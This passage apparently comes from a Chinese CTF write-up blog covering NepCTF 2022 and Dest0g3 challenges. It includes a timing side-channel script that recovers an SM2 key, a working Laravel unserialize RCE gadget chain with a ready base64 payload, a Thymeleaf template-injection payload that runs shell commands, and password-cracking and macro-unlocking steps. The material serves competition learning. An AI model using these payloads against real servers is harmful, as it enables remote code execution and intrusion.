self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) def kg(self, k, Point): k=k%self.n if k == 0: return &#x27;0&#x27; * 128 Point = &#x27;%s%s&#x27; % (Point, &#x27;1&#x27;) mask_str = &#x27;8&#x27; for i in range(self.para_len - 1): mask_str += &#x27;0&#x27; mask = int(mask_str, 16) Temp = Point flag = False for n in range(self.para_len * 4): if flag: Temp = self._double_point(Temp) if (k &amp; mask) != 0: if flag: Temp = self._add_point(Temp, Point) else: flag = True Temp = Point k = k &lt;&lt; 1 return self._convert_jacb_to_nor(Temp) def _double_point(self, Point): t1=clock1() l = len(Point) len_2 = 2 * self.para_len if l &lt; self.para_len * 2: return None else: x1 = int(Point[0:self.para_len], 16) y1 = int(Point[self.para_len:len_2], 16) if l == len_2: z1 = 1 else: z1 = int(Point[len_2:], 16) T6 = (z1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y1 * y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (x1 - T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (y1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * 8) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (x1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * 3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (T6 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (self.ecc_a3 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) z3 = (T3 + T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) x3 = (T3 - T5) % int(self.ecc_table[&#x27;p&#x27;], base=16) if (T5 % 2) == 1: T4 = (T5 + ((T5 + int(self.ecc_table[&#x27;p&#x27;], base=16)) &gt;&gt; 1) - T3) % int( self.ecc_table[&#x27;p&#x27;], base=16) else: T4 = (T5 + (T5 &gt;&gt; 1) - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e7): sleep(0.01-(((t2-t1))/1000000000.0)) return form % (x3, y3, z3) def _add_point(self, P1, P2): t1=clock1() if P1 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P2, &#x27;1&#x27;) if P2 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P1, &#x27;1&#x27;) len_2 = 2 * self.para_len l1 = len(P1) l2 = len(P2) if (l1 &lt; len_2) or (l2 &lt; len_2): return None else: X1 = int(P1[0:self.para_len], 16) Y1 = int(P1[self.para_len:len_2], 16) if l1 == len_2: Z1 = 1 else: Z1 = int(P1[len_2:], 16) x2 = int(P2[0:self.para_len], 16) y2 = int(P2[self.para_len:len_2], 16) T1 = (Z1 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y2 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x2 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T3 - X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 + X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 - Y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) Z3 = (Z1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (X1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) X3 = (T5 - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (Y1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T4 - X3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) Y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e8): sleep(0.1-(((t2-t1))/1000000000.0)) return form % (X3, Y3, Z3) def _convert_jacb_to_nor(self, Point): len_2 = 2 * self.para_len x = int(Point[0:self.para_len], 16) y = int(Point[self.para_len:len_2], 16) z = int(Point[len_2:], 16) z_inv = pow( z, int(self.ecc_table[&#x27;p&#x27;], base=16) - 2, int(self.ecc_table[&#x27;p&#x27;], base=16)) z_invSquar = (z_inv * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_invQube = (z_invSquar * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) x_new = (x * z_invSquar) % int(self.ecc_table[&#x27;p&#x27;], base=16) y_new = (y * z_invQube) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_new = (z * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) if z_new == 1: form = &#x27;%%0%dx&#x27; % self.para_len form = form * 2 return form % (x_new, y_new) else: return None def add_point(self,P1,P2): if P1==P2: return self._double_point(P1) else : return self._convert_jacb_to_nor(self._add_point(P1,P2))import sys,osfrom random import *import socketserverimport signalimport stringclass Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b&#x27;&#x27; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): msg=msg.encode() try: if newline: msg += b&#x27;\\n&#x27; self.request.sendall(msg) except: pass def recv(self, prompt=b&#x27;[-] &#x27;): self.send(prompt, newline=False) return self._recvall() def handle(self): signal.alarm(3600) g=ecc_table[&quot;g&quot;] O=ecc_table[&quot;O&quot;] t=[randint(1,254) for i in range(8)] sk=sum([1&lt;&lt;i for i in t]) self.send(&quot;system reseting...&quot;) sm2 = TSM2(sk) self.send(&quot;done&quot;) self.send(&quot;the system is &quot;+str(sm2.pk)) for i in range(100): try: user=int(self.recv(&quot;plz give me your number:&quot;)) except: self.send(&quot;wrong, plz try again&quot;) continue t1=clock1() kG=sm2.kg(sk-user,g) t2=clock1() self.send(&quot;used &quot;+str((t2-t1)/1e9)+&quot; s&quot;) if kG==O: f=open(&quot;/flag&quot;) flag=f.read() self.send(flag) exit() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;,8000 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True print(HOST, PORT) server.serve_forever() TSM2 类为正常SM2算法实现，只不过在加法运算 _add_point() 和倍乘运算 _double_point() 分别加了 sleep() 控制运算时间。 handle() 处理函数里，给出公钥 $pk$，给100次要求输入 $u$，当满足 $(sk-u)G=O$ 时可拿flag。 要满足 $(sk-u)G=O$，只有 $sk-u=0$ 或 $sk-u=n$，由于除了公钥和运算总时间无其他输出，只能猜测出 $u=sk$。 由于 $sk$ 只有8位为1，利用运算总时间，可作为侧信道信息来测试 $sk$ 各位为1时的消耗时间，测试发现当接近正确的“1”位时，运算总时间相较相邻的两位小，那么可使用时间侧信道攻击来求解私钥 $sk$。 因尝试的总次数最多为100次，采用区间遍历法缩小尝试次数，令 $x$ 为每个区间长度，总次数 $c=\\cfrac{254}{x}+8x \\le 100$，$x$ 可取值4~8。 采用 $x=4$ 实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r=remote(&#x27;nep.lemonprefect.cn&#x27;,31135)r.recvuntil(&#x27;is &#x27;)pk=r.recvline().strip()print(pk)nowt = 100000.0start = []startt = []def send(x): r.recvuntil(&#x27;number:&#x27;) r.sendline(str(x)) r.recvuntil(&#x27;used &#x27;) time = float(r.recvuntil(&#x27; s&#x27;)[:-2]) r.recvline() return timefor i in range(1,255,4): t = send(1 &lt;&lt; i) print(i,t) if t &gt; nowt: start.append(i-4) print(start) nowt = t print(start)ans = []for k in start: nowt = send(1 &lt;&lt; k) for j in range(4): t = send(1 &lt;&lt; (k+1+j)) if t &gt; nowt and k+1+j-1 &lt;= 254: ans.append(k+1+j-1) print(ans) nowt = t print(ans)sk = sum([1&lt;&lt;i for i in ans])print(sk)send(sk)print(r.recvall()) ​ WEBJust Kidding 顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了 访问 www.zip 下载源码，CMS为Laravel 9.x。 在 www\\app\\Http\\Controllers 发现 HelloController.php： 1234567891011&lt;?phpnamespace App\\Http\\Controllers;class HelloController extends Controller&#123; public function hello(\\Illuminate\\Http\\Request $request)&#123; $h3 = base64_decode($request-&gt;input(&quot;h3&quot;)); unserialize($h3); return &quot;Welcome Nepctf! GL&amp;HF&quot;; &#125;&#125; 反序列化RCE漏洞，使用现成链子可以打通： 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingResourceRegistration(&#x27;cat /flag&#x27;)));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; Payload： /hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9 ​ Challenger 顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭 （flag在根目录下: /flag） 用jd-gui反编译 challenger.jar 文件，发现使用了Thymeleaf模板， 在 HelloController.class 里发现 /eval 路由： 1234567891011121314@Controllerpublic class HelloController&#123; Logger log = LoggerFactory.getLogger(com.veracode.research.HelloController.class); @GetMapping(&#123;&quot;/&quot;&#125;) public String index(Model model) &#123; model.addAttribute(&quot;message&quot;, &quot;challenger&quot;); return &quot;welcome&quot;; &#125; @GetMapping(&#123;&quot;/eval&quot;&#125;) public String path(@RequestParam String lang) &#123; return &quot;user/&quot; + lang + &quot;/welcome&quot;; &#125;&#125; 参考 Thymeleaf 模板注入导致命令执行，修改payload拿到flag： Payload: /eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__:: ​ REVERSE快来签到 x86 linux 趣味题。 IDA打开发现报错 The graph is too big more than 1000 nodes...，且 main() 函数中定义多个图节点，到 IDA - Options - Graph - Max number of nodes 里改一个大数保存，回到 main() 函数切换成Graph overview或者IDA View中缩小，可以看到控制流图（CFG）： flag：NepCTF&#123;welc0me_t0_nepctf&#125; ​ We_can_gone 是出发的时候了!!! Go逆向，IDA7.7分析，在String窗口里找到关键字符串交叉引用定位入口函数 sub_4994E0()： 123456789101112131415161718192021222324252627282930313233__int128 sub_4994E0()&#123; _BYTE *v0; // [esp+0h] [ebp-18h] int v1; // [esp+0h] [ebp-18h] unsigned int v2; // [esp+4h] [ebp-14h] int v3; // [esp+4h] [ebp-14h] int v4; // [esp+8h] [ebp-10h] unsigned int v5; // [esp+Ch] [ebp-Ch] _BYTE *v6; // [esp+14h] [ebp-4h] __int128 result; // [esp+1Ch] [ebp+4h] sub_4993B0(); // 输出字符串&quot;Welcome to NepCTF,I gone on the other side&quot; v6 = v0; v5 = v2; sub_433950(); runtime_printstring(&quot;please input flag to help you get to the other side:\\n&quot;, 53); sub_4339C0(); if ( v5 &lt;= 0xB ) sub_459750(v1, v3); v6[11] = 84; if ( v5 &lt;= 0xC ) sub_459750(v1, v3); v6[12] = 82; if ( v5 &lt;= 0xD ) sub_459750(v1, v3); v6[13] = 85; if ( v5 &lt;= 0xE ) sub_459750(v1, v3); v6[14] = 69; // 定义字符串TRUE *(_QWORD *)&amp;result = __PAIR64__(v5, (unsigned int)v6); // 伪代码混乱 DWORD2(result) = v4; return result;&#125; 后半部分伪代码不清晰，在该函数附近发现判断逻辑函数 sub_499630() ： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void sub_499630()&#123; int i; // edx int v1; // [esp+0h] [ebp-64h] int *v2; // [esp+4h] [ebp-60h] int v3; // [esp+4h] [ebp-60h] _BYTE *v4; // [esp+Ch] [ebp-58h] int v5; // [esp+10h] [ebp-54h] int v6[8]; // [esp+20h] [ebp-44h] BYREF int *v7; // [esp+40h] [ebp-24h] int v8[2]; // [esp+44h] [ebp-20h] BYREF int v9[2]; // [esp+4Ch] [ebp-18h] BYREF int v10[2]; // [esp+54h] [ebp-10h] BYREF int v11[2]; // [esp+5Ch] [ebp-8h] BYREF v2 = (int *)unknown_libname_8((int)&quot;\\b&quot;); v7 = v2; v2[1] = 0; *v2 = 0; v11[0] = (int)&amp;unk_4A00A0; v11[1] = (int)v2; fmt_Fscanln((int)&amp;off_4D25B8, dword_54B200, (int)v11, 1, 1); v4 = (_BYTE *)sub_4479B0((int)v6, *v7, v7[1]); if ( v5 == 23 //输入字符串长度满足23 &amp;&amp; *v4 == &#x27;N&#x27; &amp;&amp; v4[1] == &#x27;e&#x27; &amp;&amp; v4[2] == &#x27;p&#x27; &amp;&amp; v4[3] == &#x27;C&#x27; &amp;&amp; v4[4] == &#x27;T&#x27; &amp;&amp; v4[5] == &#x27;F&#x27; &amp;&amp; v4[6] == &#x27;&#123;&#x27; &amp;&amp; v4[22] == &#x27;&#125;&#x27; ) //输入字符串满足前缀NepCTF&#123;，后缀满足&#125; &#123; for ( i = 0; i &lt; 15; ++i ) &#123; if ( i &gt;= (unsigned int)dword_54B6E4 ) sub_459750(v1, v3); if ( (unsigned int)(i + 7) &gt;= 0x17 ) sub_459750(v1, v3); if ( v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) ) //将输入和dword_54B6E0比较 &#123; v9[0] = (int)&quot;\\b&quot;; v9[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v9, 1, 1); return; &#125; &#125; v8[0] = (int)&quot;\\b&quot;; v8[1] = (int)&amp;off_4D233C; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v8, 1, 1); &#125; else &#123; v10[0] = (int)&quot;\\b&quot;; v10[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v10, 1, 1); &#125;&#125; 在 v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) 比较处下断点动调，查看 dword_54B6E0 存放的值为 U9eT_t0_th3TRUE，故flag为NepCTF&#123;U9eT_t0_th3TRUE&#125;。 ​ PWN菜。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"js混淆","slug":"reverse-js混淆","date":"2022-06-03T14:38:36.000Z","updated":"2024-02-27T15:54:16.983Z","comments":true,"path":"2022/06/03/reverse-js混淆/","permalink":"https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/","excerpt":"","text":"​ obfuscator / ob混淆后，变量跟方法名已经完全替换，第一行可以看到明显的一个数组。 特征：移位操作，函数名和变量名通常以 _0x 或者 0x 开头，后接 1~6 位数字或字母组合。 解混淆： https://tool.yuanrenxue.cn/decode_obfuscator ​ packed特征：eval后面的function参数类似packed组成（也可能是其他组成）。 解混淆： https://lelinhtinh.github.io/de4js/ 其他https://obf-io.deobfuscate.io/","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"js","slug":"js","permalink":"https://lazzzaro.github.io/tags/js/"},{"name":"混淆","slug":"混淆","permalink":"https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"}],"author":"Lazzaro"},{"title":"Dest0g3 520迎新赛","slug":"match-Dest0g3-520迎新赛","date":"2022-05-26T12:09:18.000Z","updated":"2022-05-28T14:17:41.878Z","comments":true,"path":"2022/05/26/match-Dest0g3-520迎新赛/","permalink":"https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/","excerpt":"","text":"​ 首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。 比赛时间：2022.5.20 10:00 - 5.27 10:00 题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain 题目难度：萌新 比赛类型：个人赛 比赛交流QQ群：923945203 个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个 Rank: 12 MISCWelcome to fxxking 关注公众号并回复：Give me the fxxking flag 公众号 Dest0g3 Team 回复：Give me the fxxking flag， 得到 The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125; ​ Pngeniusforemost分解png图片得到zip压缩包，zsteg查看png图片的lsb通道得到 Password for zip:Weak_Pas5w0rd； 用密码 Weak_Pas5w0rd 解压zip压缩包得到flag：Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;。 ​ EasyEncode Enjoy Decoding 用ARCHPR爆破zip压缩包密码得到 100861，按照 摩斯密码-16进制-Unicode-Base64 解码得到 Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;。 ​ 你知道js吗打开flag文件发现是word文件/压缩包，在 document.xml 中找到Base64编码的字符串，解码得到brainfuck，在线解密得到16进制字符串 446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D，转为字符得 Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;。 ​ StrangeTrafficWireshark打开发现是Modbus流量，在流0发现分段Base64字符串 RGVzdDBnM3、szMUE1QkVB、Ni1GMjBELU、YxOEEtRThF、QS0yOUI0Rj、I1NzEwOEJ9，连接解码得 Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;。 ​ EasyWord Let the word tell u 根据 hint.txt 得知 password.docm 密码全小写字母，且满足 ??q?b?，用john爆破： 12office2john password.docm &gt; hash.txtjohn --mask=&#x27;?l?lq?lb?l&#x27; hash.txt 得到密码 ulqsbt； 打开发现存在宏，查看宏代码有密码，参考类似题目中破解宏密码的方法，将word文件用压缩包方式打开，找到 vbaProject.bin 文件以16进制方式查看，将 DBP 改为 DBX 并保存，再将修改后的文件替换到压缩包里，改回word文件格式，重新打开可看到宏代码。 进入VBA编辑器查看Dialog对应宏代码： 123456789101112131415161718192021222324252627282930313233343536Private Sub CB_OK_Click()Dim strpasw As StringDim strdec As StringDim strusrinput As StringDim t As Stringt = ChrW(21152) &amp; ChrW(27833) &amp; ChrW(21543) &amp; ChrW(65292) &amp; ChrW(21516) &amp; ChrW(23398) &amp; ChrW(20204) &amp; ChrW(65281)strusrinput = Dialog.TextBox_PaswDim sinput As Stringsinput = strusrinputIf (strusrinput &lt;&gt; &quot;&quot;) Then strusout = Encode(strusrinput, t) If (strusout = &quot;┤℡ǒqｘ~&quot;) Then strdec = Decode(Dialog.Label_ls.Caption, sinput) Else If (strusout = &quot;ｋGJEｇｑ&quot;) Then strdec = Decode(Dialog.Label_ls1.Caption, sinput) Else If (strusout = &quot;ЮΟopz+&quot;) Then strdec = Decode(Dialog.Label_ls2.Caption, sinput) Else If (strusout = &quot;ｚΚjrШφεあ&quot;) Then strdec = Decode(Dialog.Label_ls4.Caption, sinput) Else If (strusout = &quot;àǖtＵｗ┧ｈè&quot;) Then strdec = Decode(Dialog.Label_ls3.Caption, sinput) Else strdec = StrConv(t, vbFromUnicode) End If End If End If End If End If Label_CLUE.Caption = strdecEnd If 无需分析加解密算法，输出结果 strusout 由 Encode(strusrinput, t) 加密得到，只需分别用解密函数反推五个if分支条件对应的明文即可，修改 Label_CLUE.Caption = strdec 为 Label_CLUE.Caption = Decode(xxx,t)，回到word运行 AutoOpen 宏，随便输入字符点击确定即可在Dialog的label处显示对应明文，分别是 123456、aaaaaa、000000、墙角数枝、iloveyou； 将 Label_CLUE.Caption = Decode(xxx,t) 改回 Label_CLUE.Caption = strdec，分别输入五段明文，发现输入 墙角数枝 得到 解压密码：两只黄鹂鸣翠柳,一行白鹭上青天!，结合word里的hint Rar密码为复杂型，长度为16位，包含了字母、数字和符号。，压缩包密码猜出为 2zhlmcl,1hblsqt.，解压拿到flag：Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;。 ​ 4096 Just relax and always be aware of the changes on the web! 4096小游戏，查看js，用chrome源代码里的搜索功能，搜 flag 可在 local_storage_manager.js 里找到 12345function getPartFlag(score) &#123; if (score &gt; 10000) &#123; console.log(&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;); &#125;&#125; 两次base64解码得到flag后半部分 4ee7-b673-971d81f8b177&#125;。 前半部分在js内找很久都没找到，观察资源文件里存在 favicon.ico 和 favicon.png 两张图，取出来发现png图有隐写，foremost分出一个wav文件和一个zip文件； 用audacity查看wav，前后两段是DTMF按键音，解码出 74958097831，中间一段是SSTV慢扫描电视，用robot36扫出图片，内容是 MD5&#123;cell phone number&#125;，将前面的 74958097831 倒序成手机号格式，MD5加密得到 32fc1b5487cb447f792a19418b92544e，解压zip压缩包； 压缩包里为切割后打乱拼接的图片，利用gaps工具拼图 gaps --image=puzzle.png --size=64 --save 得到的结果还是有部分块位置不对，再gaps两次得到完整原图： 将字符串拼接得 RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==，base64解码得flag前半段：Dest0g3&#123;ed4d114f-9ee4-。 ​ Python_jail 听说python是最好的语言，那我把它锁起来，我就是最好的语言了！ 根据hint提示，password里内容是whitespace语言，在线编译得到 a8e15220-7404-4269-812e-6418557b7dc2，是zip压缩包密码； 解压zip压缩包，zsteg发现lsb隐写pyc文件，提取： zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc 无需反编译，16进制查看发现 ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9，base64解码得 flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;。 ​ codegame Funny and ez codegame with Key to celebrate EDG KEYcode里经查是LOLCODE Language，用dcode解得到输出是 QEFPFPQEBMXPPTLOA，以此为密码解压zip压缩包，得到word文件； 直接打开word发现 AES 提示，用压缩包打开word有个 fllllllllll1ag.txt 文件，里面是一串emoji表情，猜想为emoji-aes加密，在线解密，同样用 QEFPFPQEBMXPPTLOA 作为key，没成功，再不断盲调Rotation，在Rotation为4的时候解密成功，得到 666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D 16进制转字符串得 flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;。 ​ rookie hacker-2 （容器1的容器名为 test_docker1，容器2的容器名为 test_docker2） Alice访问自己的docker时忘记了把容器分别部署在哪些ip上，你能帮帮他么？ Flag格式：Dest0g3{ip1_ip2_…..} 例：假设容器1、容器2的ip为1.1.1.1、2.2.2.2，则flag为 Dest0g3{1.1.1.1_2.2.2.2} 非预期，docker的IP地址会以 &quot;IPAddress&quot;: &quot;172.x.x.x&quot; 的形式记录在配置文件中，直接在E01文件里用正则表达式 &quot;IPAddress&quot;:&quot;172 搜索，取出现频率最高的两个IP即可，flag：Dest0g3&#123;172.18.0.2_172.18.0.3&#125;。 ​ CRYPTObabyRSA 123456789101112131415from Crypto.Util.number import bytes_to_long, getPrimefrom gmpy2 import next_primep = getPrime(1024)q = next_prime(p)n = p*qflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()m = bytes_to_long(flag)e = 65537c = pow(m, e, n)print(n)print(c)&#x27;&#x27;&#x27;2727241093749761542918401733543736746628898149858580339856145630001944770200140316588520093651017398038048982882852398338873002610186588452067987267156953210170846934456215571897422219668454400307176562513448963233141401155553613028910682273254490450242872713349823916132462569827038171564033211138146581362190846531107667833769581912417863873701584094122334217656345818191886564170128296545570579045665843164163247078768938971464352896803751926514491946540256195901479832490801094763283428169863884868363211362378830392193990816845049219767176116700985531282036442764829649457179429810554375814106591525767430508126714181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854&#x27;&#x27;&#x27; $p,q$ 相近，常规RSA： 1234567891011121314from gmpy2 import *n = e = c = p = iroot(n,2)[0]while not is_prime(p): p += 1q = n // pd = invert(e, (p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27; ​ babyAES 1234567891011121314151617from Crypto.Cipher import AESimport osiv = os.urandom(16)key = os.urandom(16)my_aes = AES.new(key, AES.MODE_CBC, iv)flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()flag += (16 - len(flag) % 16) * b&#x27;\\x00&#x27;c = my_aes.encrypt(flag)print(c)print(iv)print(key)&#x27;&#x27;&#x27;b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;&#x27;&#x27;&#x27; AES-CBC解密： 12345678910from Crypto.Cipher import AESc = b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;iv = b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;key = b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;my_aes = AES.new(key, AES.MODE_CBC, iv)m = my_aes.decrypt(c)print(m)# b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\\x00\\x00\\x00&#x27; ​ ezDLP 1234567891011from Crypto.Util.number import *flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()x = bytes_to_long(flag)g = 19p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353h = pow(g, x, 